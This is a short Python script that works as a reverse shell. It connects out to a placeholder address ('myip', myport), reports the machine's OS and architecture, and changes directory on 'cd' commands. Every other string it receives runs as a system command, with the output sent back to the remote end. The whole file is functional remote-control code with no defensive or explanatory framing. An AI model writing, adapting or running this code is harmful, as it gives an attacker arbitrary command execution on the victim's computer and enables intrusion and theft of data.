from socket import *

import subprocess
import platform
import os

s = socket(2,1)
s.connect(("myip",myport))



def sysinfo():
    uname = "os = "+platform.uname()[0]+" "+platform.uname()[2]+" "+platform.architecture()[0]+"\n"
    uname = str(uname)
    s.send(uname.encode())  

def change_dir(name):

    os.chdir(name[3:])
    s.send(b"changed Directory")



def run_command(command):
    value = subprocess.getoutput(command)

    if value == None or value == '':
        s.send(" Ok ! ".encode())

    s.send(value.encode()) 
    
       
while True:
    s.send(os.getcwd().encode()+b" > ")
    data = s.recv(12345).decode()
    if data == "v":
        continue

    elif data == "1":
        sysinfo()
        continue
        
    elif data[0:2] == 'cd':
        try:
            change_dir(data)
            continue
        except:
            s.send("Not Found".encode())
            continue


    run_command(data)
    continue

s.close()
